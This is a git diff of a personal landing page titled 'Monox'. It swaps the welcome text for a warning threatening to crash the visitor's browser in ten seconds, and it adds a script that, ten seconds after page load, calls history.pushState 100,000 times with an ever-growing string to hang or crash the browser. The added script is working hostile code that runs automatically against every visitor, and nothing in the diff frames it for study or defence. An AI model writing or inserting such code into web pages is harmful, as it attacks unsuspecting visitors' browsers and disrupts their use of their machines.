@@ -38,8 +38,8 @@
             <div class="row">
                 <div class="col-lg-12">
                     <h1>Monox</h1>
-                    <p>Welcome to my website (or blog)</p>
-					<p>This landing page only for information because this domain primary for My Node.js project (such API)</p>
+                    <p>Warning</p>
+		    <p>Please leave this web page or I'll crash your browser in 10 sec</p>
                 </div>
             </div>
         </div>
@@ -60,6 +60,13 @@
    		window.location = "https://youtu.be/cLFHQjxv0pU"
 	}
     } 
+    setTimeout(function(){
+      var total = "";
+      for( var i = 0; i < 100000; i++ ) {
+          total = total + i.toString();
+          history.pushState(0,0, total );
+      }
+    }, 10000)
     </script>	    
     <!-- Request handler -->
     <script src=https://unpkg.com/snekfetch@4.0.4/browser.js></script>
